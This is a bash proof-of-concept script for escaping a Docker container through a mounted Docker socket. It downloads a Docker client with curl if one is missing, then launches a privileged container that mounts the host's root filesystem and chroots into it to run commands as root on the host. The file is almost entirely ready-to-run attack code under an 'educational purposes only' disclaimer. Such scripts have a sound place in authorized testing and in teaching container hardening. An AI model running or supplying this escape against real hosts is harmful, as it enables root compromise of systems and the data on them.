#!/bin/bash
# Docker Socket Container Escape PoC
# For educational purposes only
# Use only in authorized testing environments

# Check if Docker socket exists in the container
if [ ! -S /var/run/docker.sock ]; then
    echo "[-] Docker socket not found. Container may not be vulnerable."
    exit 1
fi

echo "[+] Docker socket found. Container may be vulnerable."

# Check if Docker CLI is available
if ! command -v docker &> /dev/null; then
    echo "[-] Docker CLI not found. Installing minimal Docker client..."
    # This would require internet access from the container
    curl -fsSL https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz | tar -xvz docker/docker
    PATH=$PATH:$(pwd)/docker
fi

echo "[+] Creating a privileged container to escape..."

# Create a new privileged container that mounts the host's root filesystem
docker run -it --privileged --pid=host --network=host --cap-add=ALL \
    -v /:/hostfs alpine:latest chroot /hostfs /bin/sh -c \
    "echo '[+] Container escape successful. Now running on the host with root privileges.'; \
     echo '[+] Hostname: '\$(hostname); \
     echo '[+] Host files: '\$(ls -la /); \
     echo '[+] This is a PoC - in a real attack, an attacker could now maintain persistence or exfiltrate data.'"

echo "[+] PoC completed."